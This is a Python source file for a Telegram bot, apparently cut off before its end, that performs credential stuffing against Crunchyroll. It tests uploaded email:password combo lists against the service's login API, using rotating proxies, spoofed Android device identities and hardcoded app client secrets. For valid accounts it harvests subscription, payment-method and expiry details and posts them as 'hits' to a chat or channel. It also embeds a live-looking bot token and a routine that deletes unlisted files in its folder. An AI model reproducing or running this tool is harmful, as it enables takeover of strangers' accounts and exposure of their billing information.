r"""
c:\Users\HP5CD\OneDrive\Desktop\Nova Proxy Checker\Crunchy roll txt\crunchyroll_bot.py
"""
import os
import sys
import time
import random
import threading
import requests
import telebot
import re
import uuid
from telebot import types
from telebot.apihelper import ApiTelegramException
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.client import RemoteDisconnected
import logging

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Suppress TeleBot noisy error logs
telebot.logger.setLevel(logging.CRITICAL)

# --- CONFIGURATION ---
TOKEN_FILE = 'bot_token.txt'
REQUIRED_CHANNELS = ["@F88UF9844", "-1001003846344952"]
ADMIN_IDS = [7383471237, 6176299339]
USERS_FILE = 'users.txt'

def get_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            token = f.read().strip()
            if token:
                return token
    default_token = "8299995940:AAEO3l6zuxzWzDBcEp8dyV8xClldZZR6EF0"
    print(f"[!] '{TOKEN_FILE}' not found or empty. Creating it with the default token.")
    with open(TOKEN_FILE, 'w') as f:
        f.write(default_token)
    return default_token

# --- CLEANUP FUNCTION ---
def cleanup_old_files():
    print("[*] Cleaning up old files...")
    current_script = os.path.basename(__file__)
    whitelist = [current_script, "runner.bat", "hits.txt", "bot_token.txt", "users.txt"]
    
    for filename in os.listdir('.'):
        if filename not in whitelist and os.path.isfile(filename):
            try:
                os.remove(filename)
                print(f"[-] Deleted: {filename}")
            except Exception as e:
                print(f"[!] Could not delete {filename}: {e}")

# --- USER MANAGEMENT ---
def save_user(user_id):
    try:
        if not os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'w') as f: f.write("")
        
        with open(USERS_FILE, 'r') as f:
            users = f.read().splitlines()
        
        if str(user_id) not in users:
            with open(USERS_FILE, 'a') as f:
                f.write(f"{user_id}\n")
    except: pass

# --- GLOBAL STATE ---
user_states = {}
user_data = {}
bot = None

# --- CRUNCHYROLL API ---
class CrunchyrollChecker:
    def __init__(self):
        self.session = requests.Session()
        # Rotate User-Agents to mimic different devices (Human Behavior)
        # Tuple format: (User-Agent, Device-Name) for 100% Realism
        self.ua_data = [
            ('Crunchyroll/3.63.1 Android/14 model/Pixel 8 Pro build/UQ1A.240205.004', 'Pixel 8 Pro'),
            ('Crunchyroll/3.62.0 Android/14 model/Samsung Galaxy S24 Ultra build/UP1A.231005.007', 'Samsung Galaxy S24 Ultra'),
            ('Crunchyroll/3.61.1 Android/13 model/Pixel 7 build/TQ3A.230901.001', 'Pixel 7'),
            ('Crunchyroll/3.60.0 Android/13 model/OnePlus 11 build/CPH2447', 'OnePlus 11'),
            ('Crunchyroll/3.59.0 Android/12 model/Xiaomi 12 build/SKQ1.211006.001', 'Xiaomi 12'),
            ('Crunchyroll/3.58.0 Android/12 model/Pixel 6 build/SQ3A.220705.004', 'Pixel 6'),
            ('Crunchyroll/3.55.0 Android/11 model/Samsung Galaxy S21 build/RP1A.200720.012', 'Samsung Galaxy S21'),
            ('Crunchyroll/3.54.0 Android/11 model/OnePlus 9 Pro build/LE2121', 'OnePlus 9 Pro'),
            ('Crunchyroll/3.53.0 Android/10 model/Pixel 4 XL build/QD1A.190821.007', 'Pixel 4 XL'),
            ('Crunchyroll/3.52.0 Android/10 model/Xiaomi Mi 10 build/QKQ1.191117.002', 'Xiaomi Mi 10')
        ]
        self.current_ua, self.device_name = random.choice(self.ua_data)
        self.headers = {
            'Origin': 'https://www.crunchyroll.com',
            'User-Agent': self.current_ua,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'beta-api.crunchyroll.com',
            'Connection': 'close',
            'Accept-Encoding': 'gzip'
        }
        # Multiple Client Credentials (Rotation)
        self.client_auths = [
            ('ajcylfwdtjjtq7qpgks3', 'oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_'), # Android (Standard)
            ('bmt2Z290cm16bW10b2l4eHk5c2Q', 'QtM1WnJ5Y216Q3l6V0Z0'),         # iOS (Backup)
            ('yhukoj8on9w2pcpgjkn_', 'q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF')     # FireTV (New from your config)
        ]

    def close(self):
        try: self.session.close()
        except: pass

    def __del__(self):
        # Ensure connection is closed when checker is destroyed
        try: self.session.close()
        except: pass

    def login(self, email, password, proxy=None):
        # 0 Wait Time (Removed Human Delay for Max Speed)
        
        device_id = str(uuid.uuid4())
        session_id = str(uuid.uuid4())
        
        headers = self.headers.copy()
        headers['etp-anonymous-id'] = session_id
        
        # Use Basic Auth for client credentials (more reliable)
        auth = random.choice(self.client_auths)
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'device_type': random.choice(['com.crunchyroll.crunchyroid', 'SamsungTV', 'FireTV', 'Android', 'IP_bE']),
            'device_id': device_id,
            'device_name': self.device_name
        }
        
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        # Retry logic for robustness
        for attempt in range(3):
            try:
                res = self.session.post(
                    "https://beta-api.crunchyroll.com/auth/v1/token", 
                    data=data, 
                    headers=headers, 
                    auth=auth,
                    proxies=proxies, 
                    timeout=5, # Reduced for speed
                    verify=False
                )
                
                if res.status_code == 200 and "access_token" in res.text:
                    json_resp = res.json()
                    token = json_resp.get('access_token')
                    acc_id = json_resp.get('account_id')
                    
                    # Try to check premium (Retry internally to avoid re-login)
                    for _ in range(3):
                        p_data = self.check_premium(token, acc_id, proxies)
                        if p_data:
                            return p_data
                        # No sleep, instant retry
                        
                    # If check fails after retries, return Fallback Hit (Valid Login)
                    # This ensures valid accounts are NOT marked as Bad/Error
                    return {
                        'plan': 'Unknown (Login Success)',
                        'country': 'Unknown', 'payment': 'Unknown', 'renew': 'Unknown',
                        'expiry': 'Unknown', 'days': 'Unknown', 'status': 'Active',
                        'created': 'Unknown', 'verified': 'Unknown', 'sub_id': 'N/A'
                    }
                
                # STRICT ERROR HANDLING
                # Only mark as BAD if API explicitly says "invalid_grant" (Wrong Password)
                elif res.status_code in [400, 401]:
                    try:
                        err_resp = res.json()
                        if err_resp.get('error') == 'invalid_grant':
                            return False
                    except:
                        pass
                    # If 400/401 but NOT invalid_grant, it's likely a proxy/header issue.
                    # Return None to retry/count as Error instead of Bad.
                    return None
                
                elif res.status_code == 429:
                    # Rate limit detected, switch proxy immediately (No Sleep)
                    return None
                
                # All other errors (403, 5xx, timeouts) return None to trigger retry/error count
                
            except Exception:
                # No sleep on retry if using proxy (Fast Rotation)
                continue
        return None

    def check_premium(self, access_token, account_id, proxies):
        # Default values (Fail-safe)
        # If login worked, the account IS valid. We default to Free/Active.
        data = {
            'plan': 'Free',
            'country': 'Unknown',
            'payment': 'None',
            'renew': 'False',
            'expiry': 'Unknown',
            'days': '0',
            'status': 'Active',
            'created': 'Unknown',
            'verified': 'Unknown',
            'sub_id': 'N/A',
            'devices': '0',
            'price': '',
            'currency': ''
        }
        
        headers = self.headers.copy()
        headers['authorization'] = f'Bearer {access_token}'
        
        # 1. Try to get Profile (Created Date, Verified, External ID)
        external_id = None
        
        try:
            # Get Profile for External ID
            me_res = self.session.get(
                'https://beta-api.crunchyroll.com/accounts/v1/me',
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            if me_res.status_code == 200:
                me_json = me_res.json()
                external_id = me_json.get('external_id')
                data['created'] = me_json.get('created', 'Unknown').split('T')[0]
                data['verified'] = "Yes" if me_json.get('is_verified') else "No"
        except:
            pass
            
        # 2. Try to get Benefits (Country & Fallback Plan)
        try:
            ben_res = self.session.get(
                f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id or "0"}/benefits',
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            
            has_benefit = False
            benefit_source = 'Unknown'
            
            if ben_res.status_code == 200:
                ben_json = ben_res.json()
                data['country'] = ben_json.get('subscription_country', 'Unknown')
                if ben_json.get('items'):
                    has_benefit = True
                    benefit_source = ben_json['items'][0].get('source', 'Unknown')
        except:
            pass
            
        # 3. Try to get Subscription V4 (NEW - Best for Payment/Renewal Info)
        v4_success = False
        try:
            sub_v4_res = self.session.get(
                f'https://beta-api.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions',
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            if sub_v4_res.status_code == 200:
                v4_data = sub_v4_res.json()
                if v4_data.get('total', 0) > 0 and v4_data.get('items'):
                    item = v4_data['items'][0]
                    v4_success = True
                    
                    # Plan
                    product = item.get('product', {})
                    sku = product.get('sku', 'fan')
                    plan_map = {
                        'fan_pack': 'Mega Fan',
                        'mega_fan_pack': 'Mega Fan',
                        'super_fan_pack': 'Ultimate Fan',
                        'premium': 'Fan',
                    }
                    data['plan'] = plan_map.get(sku, sku.replace('_', ' ').title())
                    
                    # Payment
                    data['payment'] = item.get('paymentMethodType', 'Unknown').replace('_', ' ').title()
                    
                    # Expiry/Renewal
                    expiry = item.get('nextRenewalDate')
                    if expiry:
                        data['expiry'] = expiry.split('T')[0]
                        try:
                            exp_dt = datetime.strptime(data['expiry'], '%Y-%m-%d')
                            data['days'] = str((exp_dt - datetime.now()).days) + " Days"
                        except: pass
                    
                    # Price
                    try:
                        amount = item.get('amount')
                        currency = item.get('currencyCode')
                        if amount and currency:
                            data['price'] = str(amount)
                            data['currency'] = currency
                    except: pass
                    
                    data['renew'] = "✅ Yes" # V4 usually implies active sub
                    data['status'] = "Active"
                    data['sub_id'] = item.get('subscriptionId', 'N/A')
        except:
            pass

        # 4. Try to get Subscription V3 (Fallback if V4 fails or empty)
        if not v4_success:
            try:
                sub_res = self.session.get(
                    f'https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}',
                    headers=headers,
                    proxies=proxies,
                    timeout=10,
                    verify=False
                )

                if sub_res.status_code == 200:
                    sub_data = sub_res.json()
                    
                    # Plan Parsing
                    plan_raw = sub_data.get('tier', 'Free')
                    if plan_raw == 'Free' and sub_data.get('product', {}).get('sku', '').startswith('fan'):
                        plan_raw = sub_data.get('product', {}).get('sku')

                    plan_map = {
                        'fan_pack': 'Mega Fan (Monthly)',
                        'mega_fan_pack': 'Mega Fan',
                        'super_fan_pack': 'Ultimate Fan',
                        'premium': 'Fan',
                        'cr_fan': 'Fan',
                        'cr_mega_fan': 'Mega Fan'
                    }
                    data['plan'] = plan_map.get(plan_raw, plan_raw.replace('_', ' ').title())
                    
                    # FIX: If Plan is Free but Benefits exist, mark as Premium (Legacy/Mobile)
                    if data['plan'] == 'Free' and has_benefit:
                        data['plan'] = 'Premium (Legacy)'
                        data['payment'] = benefit_source.replace('_', ' ').title()

                    # Payment
                    payment_raw = sub_data.get('source', benefit_source)
                    payment_map = {
                        'itunes': ' iTunes',
                        'google_play': '▶️ Google Play',
                        'paypal': '🅿️ PayPal',
                        'credit_card': '💳 Credit Card',
                        'roku': '📺 Roku'
                    }
                    data['payment'] = payment_map.get(payment_raw, payment_raw.replace('_', ' ').title())
                    
                    # Expiry
                    expiry = sub_data.get('expiration_date')
                    if not expiry:
                        expiry = sub_data.get('next_renewal_date')
                    
                    if expiry:
                        expiry = expiry.split('T')[0]
                        try:
                            exp_dt = datetime.strptime(expiry, '%Y-%m-%d')
                            data['days'] = str((exp_dt - datetime.now()).days) + " Days"
                        except: pass
                    else:
                        expiry = "Never"
                        data['days'] = "Lifetime"
                    
                    data['expiry'] = expiry
                    data['renew'] = "✅ Yes" if sub_data.get('auto_renew') else "❌ No"
                    data['status'] = sub_data.get('status', 'Active').title()
                    data['sub_id'] = sub_data.get('subscription_id', 'N/A')

                elif sub_res.status_code != 404 and not has_benefit:
                    # If API Error (403, 429, 500)
                    if has_benefit:
                        # Fallback: If V3 API failed but we found benefits earlier, use them!
                        data['plan'] = 'Premium (Legacy)'
                        data['payment'] = benefit_source.replace('_', ' ').title()
                        data['status'] = 'Active'
                    else:
                        # Real Network Error -> Retry
                        return None

                elif has_benefit:
                    # Fallback if v3 failed but benefits exist
                    data['plan'] = 'Premium (Legacy)'
                    data['payment'] = benefit_source.replace('_', ' ').title()
                    data['status'] = 'Active'
                    
            except:
                # Network Error -> Retry
                return None
            
        # 5. Check Active Devices (New Feature)
        try:
            dev_res = self.session.get(
                f'https://beta-api.crunchyroll.com/accounts/v1/{account_id}/devices/active',
                headers=headers,
                proxies=proxies,
                timeout=5,
                verify=False
            )
            if dev_res.status_code == 200:
                data['devices'] = str(dev_res.json().get('total', 0))
        except: pass
            
        return data

def get_flag(code):
    if not code or len(code) != 2: return "🏳️"
    try:
        return "".join([chr(127397 + ord(c)) for c in code.upper()])
    except: return "🏳️"

# --- PROXY CHECKER ---
def format_proxy(proxy, proxy_type=None):
    """Normalizes proxy format to protocol://user:pass@ip:port"""
    proxy = proxy.strip()
    if '://' in proxy:
        return proxy
    
    protocol = 'http'
    if proxy_type:
        pt = proxy_type.upper()
        if 'SOCKS4A' in pt: protocol = 'socks4a'
        elif 'SOCKS4' in pt: protocol = 'socks4'
        elif 'SOCKS5' in pt: protocol = 'socks5'
        # HTTP, HTTPS, MIX default to http if no schema
        
    if '@' in proxy:
         return f'{protocol}://{proxy}'
    
    parts = proxy.split(':')
    if len(parts) == 4:
        # Smart Detection: ip:port:user:pass vs user:pass:ip:port
        # Check if first part looks like an IP/Domain (contains dots)
        if '.' in parts[0]:
            # ip:port:user:pass -> protocol://user:pass@ip:port
            return f'{protocol}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
        else:
            # user:pass:ip:port -> protocol://user:pass@ip:port
            return f'{protocol}://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}'
            
    elif len(parts) == 2:
        return f'{protocol}://{proxy}'
    
    return f'{protocol}://{proxy}'

def validate_proxy(proxy, proxy_type=None):
    try:
        formatted = format_proxy(proxy, proxy_type)
        proxies = {'http': formatted, 'https': formatted}
        # Reduced timeout to 3s for Ultra Fast Checking
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        
        # 1. Check against Crunchyroll API (Target Specific - Fast)
        try:
            res = requests.get('https://beta-api.crunchyroll.com/health', proxies=proxies, headers=headers, timeout=3, verify=False)
            if res.status_code == 200:
                return formatted
        except: pass

        # 2. Check against Bing (Backup)
        try:
            res = requests.get('https://www.bing.com', proxies=proxies, headers=headers, timeout=3, verify=False)
            if res.status_code == 200:
                return formatted
        except: pass
        
        # 3. Check against Google (Final Backup)
        try:
            res = requests.get('https://www.google.com', proxies=proxies, headers=headers, timeout=3, verify=False)
            if res.status_code == 200:
                return formatted
        except:
            pass
    except:
        pass
    return None

def check_proxies_threaded(proxy_list, max_workers=200, progress_callback=None, stop_event=None, proxy_type=None):
    valid_proxies = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(validate_proxy, p, proxy_type) for p in proxy_list]
        for future in as_completed(futures):
            if stop_event and stop_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                # Force cancel pending futures
                for f in futures: f.cancel()
                break
            res = future.result()
            if res:
                valid_proxies.append(res)
            if progress_callback:
                progress_callback(bool(res))
    return valid_proxies

def get_progress_bar(current, total, length=10):
    percent = current / total if total > 0 else 0
    filled = int(length * percent)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {int(percent * 100)}%"

# --- SUBSCRIPTION CHECK ---
def check_subscription(user_id):
    if user_id in ADMIN_IDS:
        return []
    
    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            status = bot.get_chat_member(channel, user_id).status
            if status not in ['creator', 'administrator', 'member', 'restricted']:
                chat = bot.get_chat(channel)
                link = chat.invite_link
                if not link:
                    try: link = bot.export_chat_invite_link(channel)
                    except: link = f"https://t.me/{chat.username}" if chat.username else ""
                missing.append((chat.title, link))
        except:
            # If bot is not admin or can't check, ignore this channel
            pass
            
    return missing

# --- BOT HANDLERS ---
def start_bot(token):
    global bot
    bot = telebot.TeleBot(token)

    # --- KEYBOARDS ---
    def main_menu():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        markup.add("🚀 Start Checker", "🛠 Proxy Checker")
        markup.add("🛑 Stop Checking")
        return markup

    def back_menu():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        markup.add("🔙 Back")
        return markup

    def dest_menu():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        markup.add("📤 Send Here", "📢 Send to Channel")
        markup.add("🔙 Back")
        return markup

    def proxy_mode_menu():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        markup.add("📂 Upload Proxy File", "❌ Continue Without Proxy")
        markup.add("🔙 Back")
        return markup

    def proxy_type_menu():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
        markup.add("HTTP", "HTTPS", "SOCKS4", "SOCKS4A")
        markup.add("SOCKS5", "MIX (All Types)", "Residential")
        markup.add("Static", "Mobile", "Data Center")
        markup.add("🔙 Back")
        return markup

    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        save_user(message.from_user.id)
        missing = check_subscription(message.from_user.id)
        if missing:
            markup = types.InlineKeyboardMarkup()
            for title, link in missing:
                markup.add(types.InlineKeyboardButton(f"📢 Join {title}", url=link))
            markup.add(types.InlineKeyboardButton("✅ I Joined", callback_data="check_sub"))
            bot.reply_to(message, f"⚠️ <b>Access Denied!</b>\n\nPlease join our channels to use this bot.", reply_markup=markup, parse_mode='HTML')
            return
        
        bot.reply_to(message, 
                     "👋 <b>Crunchyroll Checker Bot (v3.0)</b>\n\n"
                     " <b>Select an option from the menu below:</b>",
                     reply_markup=main_menu(), parse_mode='HTML')

    @bot.message_handler(commands=['broadcast'])
    def handle_broadcast_command(message):
        if message.from_user.id not in ADMIN_IDS: return
        msg = bot.send_message(message.chat.id, "📢 <b>Send the message to broadcast:</b>", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_broadcast)

    def process_broadcast(message):
        if message.content_type != 'text':
            bot.send_message(message.chat.id, "❌ Please send text only.")
            return
            
        text = message.text
        if text == "🔙 Back": return go_back(message)
        
        if not os.path.exists(USERS_FILE):
            bot.send_message(message.chat.id, "❌ No users found in database.")
            return

        with open(USERS_FILE, 'r') as f:
            users = f.read().splitlines()
        
        bot.send_message(message.chat.id, f"⏳ <b>Broadcasting to {len(users)} users...</b>", parse_mode='HTML')
        
        count = 0
        for user_id in users:
            try:
                bot.send_message(user_id, f"📢 <b>Broadcast:</b>\n\n{text}", parse_mode='HTML')
                count += 1
                time.sleep(0.05) 
            except: pass
            
        bot.send_message(message.chat.id, f"✅ <b>Broadcast Complete!</b>\nSent to {count} users.", parse_mode='HTML')

    @bot.message_handler(func=lambda message: message.text == "🔙 Back")
    def go_back(message):
        
        # STRICT STOP: Stop any running process immediately when Back is pressed
        chat_id = message.chat.id
        if chat_id in user_data and 'stop_flag' in user_data[chat_id]:
            user_data[chat_id]['stop_flag'].set()
            
        bot.clear_step_handler_by_chat_id(message.chat.id)
        bot.send_message(message.chat.id, "🔙 <b>Main Menu</b>", reply_markup=main_menu(), parse_mode='HTML')

    @bot.message_handler(func=lambda message: message.text == "🚀 Start Checker")
    def menu_start_checker(message):
        missing = check_subscription(message.from_user.id)
        if missing:
            markup = types.InlineKeyboardMarkup()
            for title, link in missing:
                markup.add(types.InlineKeyboardButton(f"📢 Join {title}", url=link))
            bot.reply_to(message, f"⚠️ <b>Access Denied!</b>\n\nPlease join our channels first.", reply_markup=markup, parse_mode='HTML')
            return
            
        bot.send_message(message.chat.id, "📍 <b>Where do you want to send the hits?</b>", reply_markup=dest_menu(), parse_mode='HTML')
        bot.register_next_step_handler(message, handle_destination)

    def handle_destination(message):
        if message.text == "🔙 Back": return go_back(message)
        chat_id = message.chat.id
        
        if message.text == "📤 Send Here":
            user_data[chat_id] = {'dest': chat_id}
            ask_proxy_mode(message)
        elif message.text == "📢 Send to Channel":
            msg = bot.send_message(chat_id, "🆔 <b>Please send the Channel UID</b> (e.g., -100xxxx):", reply_markup=back_menu(), parse_mode='HTML')
            bot.register_next_step_handler(msg, verify_channel)
        else:
            bot.send_message(chat_id, "❌ Invalid Option", reply_markup=dest_menu())
            bot.register_next_step_handler(message, handle_destination)

    def verify_channel(message):
        if message.text == "🔙 Back": return go_back(message)
        chat_id = message.chat.id
        channel_id = message.text.strip()
        
        if channel_id.isdigit():
            channel_id = f"-100{channel_id}" if len(channel_id) > 10 else f"-{channel_id}"
        
        try:
            chat = bot.get_chat(channel_id)
            user_data[chat_id] = {'dest': channel_id}
            bot.send_message(chat_id, f"✅ Channel Verified: <b>{chat.title}</b>", parse_mode='HTML')
            ask_proxy_mode(message)
        except Exception as e:
            bot.send_message(chat_id, f"❌ <b>Invalid Channel ID!</b>\nError: {e}", reply_markup=back_menu(), parse_mode='HTML')
            bot.register_next_step_handler(message, verify_channel)

    def ask_proxy_mode(message):
        bot.send_message(message.chat.id, "🛡️ <b>Select Proxy Mode:</b>", reply_markup=proxy_mode_menu(), parse_mode='HTML')
        bot.register_next_step_handler(message, handle_proxy_mode)

    def handle_proxy_mode(message):
        if message.text == "🔙 Back": return go_back(message)
        chat_id = message.chat.id
        
        if message.text == "📂 Upload Proxy File":
            user_data[chat_id]['use_proxy'] = True
            bot.send_message(chat_id, "🔌 <b>Select Proxy Type:</b>", reply_markup=proxy_type_menu(), parse_mode='HTML')
            bot.register_next_step_handler(message, handle_proxy_type_select)
        elif message.text == "❌ Continue Without Proxy":
            user_data[chat_id]['use_proxy'] = False
            user_data[chat_id]['proxies'] = []
            bot.send_message(chat_id, "📂 <b>Please send your Combo List (TXT file)</b>", reply_markup=back_menu(), parse_mode='HTML')
            bot.register_next_step_handler(message, handle_combo_file)
        else:
            bot.send_message(chat_id, "❌ Invalid Option", reply_markup=proxy_mode_menu())
            bot.register_next_step_handler(message, handle_proxy_mode)

    def handle_proxy_type_select(message):
        if message.text == "🔙 Back": return go_back(message)
        chat_id = message.chat.id
        
        if message.text not in ["HTTP", "HTTPS", "SOCKS4", "SOCKS4A", "SOCKS5", "MIX (All Types)", "Residential", "Static", "Mobile", "Data Center"]:
            bot.send_message(chat_id, "❌ Invalid Option", reply_markup=proxy_type_menu())
            bot.register_next_step_handler(message, handle_proxy_type_select)
            return

        user_data[chat_id]['proxy_type'] = message.text
        bot.send_message(chat_id, f"📂 <b>Send your {message.text} Proxy List (TXT file or Paste Message)</b>", reply_markup=back_menu(), parse_mode='HTML')
        bot.register_next_step_handler(message, handle_proxy_file)

    @bot.message_handler(func=lambda message: message.text == "🛠 Proxy Checker")
    def menu_proxy_checker(message):
        missing = check_subscription(message.from_user.id)
        if missing:
            markup = types.InlineKeyboardMarkup()
            for title, link in missing:
                markup.add(types.InlineKeyboardButton(f"📢 Join {title}", url=link))
            bot.reply_to(message, f"⚠️ <b>Access Denied!</b>\n\nPlease join our channels first.", reply_markup=markup, parse_mode='HTML')
            return

        user_data[message.chat.id] = {'use_proxy': True}
        bot.send_message(message.chat.id, "🛠 <b>Proxy Checker Tool</b>\n\n <b>Select Proxy Type:</b>", reply_markup=proxy_type_menu(), parse_mode='HTML')
        bot.register_next_step_handler(message, handle_tool_proxy_type_select)

    def handle_tool_proxy_type_select(message):
        if message.text == "🔙 Back": return go_back(message)
        chat_id = message.chat.id
        
        if message.text not in ["HTTP", "HTTPS", "SOCKS4", "SOCKS4A", "SOCKS5", "MIX (All Types)", "Residential", "Static", "Mobile", "Data Center"]:
            bot.send_message(chat_id, "❌ Invalid Option", reply_markup=proxy_type_menu())
            bot.register_next_step_handler(message, handle_tool_proxy_type_select)
            return

        user_data[chat_id]['proxy_type'] = message.text
        bot.send_message(chat_id, f"📂 <b>Send your {message.text} Proxy List (TXT file or Paste Message)</b>", reply_markup=back_menu(), parse_mode='HTML')
        bot.register_next_step_handler(message, handle_tool_proxy_file)

    @bot.message_handler(func=lambda message: message.text == "🛑 Stop Checking")
    def menu_stop_checking(message):
        chat_id = message.chat.id
        if chat_id in user_data and 'stop_flag' in user_data[chat_id]:
            user_data[chat_id]['stop_flag'].set()
            bot.reply_to(message, "🛑 <b>Emergency Stop Triggered!</b>\nStopping all threads...", parse_mode='HTML')
        else:
            bot.reply_to(message, "⚠️ No process is currently running.", parse_mode='HTML')

    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if call.data.startswith('copy_'):
            combo = call.data.split('_', 1)[1]
            bot.answer_callback_query(call.id, "📋 Combo Copied!")
            bot.send_message(call.message.chat.id, f"<code>{combo}</code>", parse_mode='HTML')
        elif call.data == "check_sub":
            missing = check_subscription(call.from_user.id)
            if not missing:
                bot.answer_callback_query(call.id, "✅ Welcome!")
                bot.send_message(call.message.chat.id, "👋 <b>Welcome!</b> Select an option:", reply_markup=main_menu(), parse_mode='HTML')
            else:
                bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

    def handle_proxy_file(message):
        if message.text == "🔙 Back": return go_back(message)
        if message.text == "🛑 Stop Checking": return menu_stop_checking(message)
        
        chat_id = message.chat.id
        proxies = []

        try:
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                proxies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            elif message.text:
                proxies = message.text.splitlines()
            else:
                bot.send_message(chat_id, "❌ Please send a TXT file or Paste Proxies.")
                return

            proxies = [p.strip() for p in proxies if p.strip()]
            
            if not proxies:
                bot.send_message(chat_id, "❌ No proxies found.")
                return
            
            stop_flag = threading.Event()
            user_data[chat_id]['stop_flag'] = stop_flag
            
            # Live Stats for Proxy Check
            stats = {'total': len(proxies), 'checked': 0, 'valid': 0, 'dead': 0}
            msg = bot.send_message(chat_id, f"⏳ <b>Initializing Proxy Check...</b>", parse_mode='HTML')
            
            def update_stats():
                while stats['checked'] < stats['total'] and not stop_flag.is_set():
                    time.sleep(2)
                    try:
                        bot.edit_message_text(
                            f"⏳ <b>Checking Proxies...</b>\n\n"
                            f"<b>Total:</b> {stats['total']}\n"
                            f"<b>Checked:</b> {stats['checked']}\n"
                            f"<b>✅ Valid:</b> {stats['valid']}\n"
                            f"<b>❌ Dead:</b> {stats['dead']}",
                            chat_id, msg.message_id, parse_mode='HTML')
                    except: pass
            
            threading.Thread(target=update_stats).start()
            
            def progress_cb(is_valid):
                stats['checked'] += 1
                if is_valid: stats['valid'] += 1
                else: stats['dead'] += 1

            proxy_type = user_data[chat_id].get('proxy_type')
            # Increased to 1000 Threads for Ultra Fast Checking
            valid_proxies = check_proxies_threaded(proxies, max_workers=1000, progress_callback=progress_cb, stop_event=stop_flag, proxy_type=proxy_type)
            user_data[chat_id]['proxies'] = valid_proxies
            
            bot.edit_message_text(f"✅ <b>Proxy Check {'Stopped' if stop_flag.is_set() else 'Complete'}!</b>\n\nTotal: {len(proxies)}\nValid: {len(valid_proxies)}\nInvalid: {len(proxies) - len(valid_proxies)}", 
                                  chat_id, msg.message_id, parse_mode='HTML')
            
            if not valid_proxies:
                bot.send_message(chat_id, "⚠️ No valid proxies found. Continuing without proxies.")
            
            msg = bot.send_message(chat_id, "📂 <b>Now send your Combo List (TXT file)</b>", reply_markup=back_menu(), parse_mode='HTML')
            bot.register_next_step_handler(msg, handle_combo_file)
            
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error processing file: {e}")

    def handle_tool_proxy_file(message):
        if message.text == "🔙 Back": return go_back(message)
        if message.text == "🛑 Stop Checking": return menu_stop_checking(message)
        
        chat_id = message.chat.id
        proxies = []

        try:
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                proxies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            elif message.text:
                proxies = message.text.splitlines()
            else:
                bot.send_message(chat_id, "❌ Please send a TXT file or Paste Proxies.")
                return

            proxies = [p.strip() for p in proxies if p.strip()]
            
            if not proxies:
                bot.send_message(chat_id, "❌ No proxies found.")
                return
            
            stop_flag = threading.Event()
            user_data[chat_id]['stop_flag'] = stop_flag
            
            # Live Stats for Tool
            stats = {'total': len(proxies), 'checked': 0, 'valid': 0, 'dead': 0}
            msg = bot.send_message(chat_id, f"🚀 <b>Initializing Ultra Fast Check...</b>", parse_mode='HTML')
            
            def update_tool_stats():
                while stats['checked'] < stats['total'] and not stop_flag.is_set():
                    time.sleep(1.5) # Faster updates for tool
                    try:
                        bot.edit_message_text(
                            f"🚀 <b>Checking Proxies (Live)...</b>\n\n"
                            f"<b>Total:</b> {stats['total']}\n"
                            f"<b>Checked:</b> {stats['checked']}\n"
                            f"<b>✅ Valid:</b> {stats['valid']}\n"
                            f"<b>❌ Dead:</b> {stats['dead']}",
                            chat_id, msg.message_id, parse_mode='HTML')
                    except: pass
            
            threading.Thread(target=update_tool_stats).start()
            
            def progress_cb(is_valid):
                stats['checked'] += 1
                if is_valid: stats['valid'] += 1
                else: stats['dead'] += 1
            
            proxy_type = user_data[chat_id].get('proxy_type')
            # Use 1000 Threads for Tool Mode
            valid_proxies = check_proxies_threaded(proxies, max_workers=500, progress_callback=progress_cb, stop_event=stop_flag, proxy_type=proxy_type)
            
            # Save valid proxies to file
            valid_filename = f"valid_proxies_{chat_id}.txt"
            with open(valid_filename, "w") as f:
                f.write("\n".join(valid_proxies))
            
            # Send file back to user
            with open(valid_filename, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ <b>Check Complete!</b>\n\nTotal: {len(proxies)}\nValid: {len(valid_proxies)}\nDead: {len(proxies) - len(valid_proxies)}")
            
            os.remove(valid_filename)
            
            # Continue flow
            msg = bot.send_message(chat_id, "🔙 <b>Check Finished.</b>", reply_markup=main_menu(), parse_mode='HTML')
            
        except Exception as e:
